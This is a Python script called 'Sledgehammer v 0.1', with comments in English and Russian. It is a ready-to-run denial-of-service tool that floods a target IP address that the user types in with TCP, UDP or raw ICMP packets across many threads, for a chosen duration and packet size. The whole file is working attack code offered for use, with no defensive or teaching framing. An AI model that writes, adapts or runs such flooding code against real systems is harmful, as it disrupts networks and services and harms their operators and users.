import socket
import random
import time
import threading

# function to generate a random string
# функция для генерации рандомной строки
def random_string(length):
    return ''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for i in range(length))

#TCP attack
def tcp_attack(ip, port, power, duration, num_threads):
    print(f"Starting TCP attack on {ip}:{port} with power {power} for {duration} seconds with {num_threads} threads")
    duration = time.time() + duration
    finished_threads = 0
    for i in range(num_threads):
        thread = threading.Thread(target=tcp_attack_thread, args=(ip, port, power, duration, ))
        thread.start()

    while time.time() < duration:
        time.sleep(1)

    print("TCP attack finished")

# function to perform TCP attack
# Функция для выполнения TCP атаки
def tcp_attack_thread(ip, port, power, duration):
    while time.time() < duration:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.sendall(random_string(power).encode())
            s.close()
        except:
            pass
    
    print("TCP attack thread finished")

#UDP attack
def udp_attack(ip, port, power, duration, num_threads):
    print(f"Starting UDP attack on {ip}:{port} with power {power} for {duration} seconds with {num_threads} threads")
    duration = time.time() + duration
    finished_threads = 0
    for i in range(num_threads):
        thread = threading.Thread(target=udp_attack_thread, args=(ip, port, power, duration, ))
        thread.start()

    while time.time() < duration:
        time.sleep(1)

    print("UDP attack finished")

# function to perform UDP attack
# Функция для выполнения UDP атаки
def udp_attack_thread(ip, port, power, duration):
    while time.time() < duration:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(random_string(power).encode(), (ip, port))
            s.close()
        except:
            pass


#ICMP attack
def icmp_attack(ip, power, duration, num_threads):
    print(f"Starting ICMP attack on {ip} with power {power} for {duration} seconds with {num_threads} threads")
    duration = time.time() + duration
    finished_threads = 0
    for i in range(num_threads):
        thread = threading.Thread(target=icmp_attack_thread, args=(ip, power, duration, ))
        thread.start()

    while time.time() < duration:
        time.sleep(1)

    print("ICMP attack finished")

# function to perform ICMP attack
# Функция для выполнения ICMP атаки
def icmp_attack_thread(ip, power, duration):
    while time.time() < duration:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            packet_id = random.randint(0, 65535)
            packet_seq = random.randint(0, 65535)
            packet = b'\x08\x00\x00\x00' + packet_id.to_bytes(2, byteorder='big') + packet_seq.to_bytes(2, byteorder='big') + random_string(power).encode()
            s.sendto(packet, (ip, 0))
            s.close()
        except:
            pass

# main program loop
# ключевой цикл программы
print("Sledgehammer v 0.1")
print("Created by conteynerrr")
while True:
    print("Select a protocol:")
    print("1. TCP")
    print("2. UDP")
    print("3. ICMP")
    protocol = int(input("Enter protocol number: "))
    if protocol not in [1, 2, 3]:
        print("Invalid protocol number")
        continue

    ip = input("Enter IP address of target: ")
    port = int(input("Enter port number of target: "))
    power = int(input("Enter attack power (bytes per packet): "))
    duration = int(input("Enter attack duration (seconds): "))
    num_threads = int(input("Enter number of threads: "))

    if protocol == 1:
        tcp_attack(ip, port, power, duration, num_threads)
    elif protocol == 2:
        udp_attack(ip, port, power, duration, num_threads)
    elif protocol == 3:
        icmp_attack(ip, power, duration, num_threads)

    repeat = input("Do you want to repeat? (Y/N): ")
    if repeat.lower() != 'y':
        break
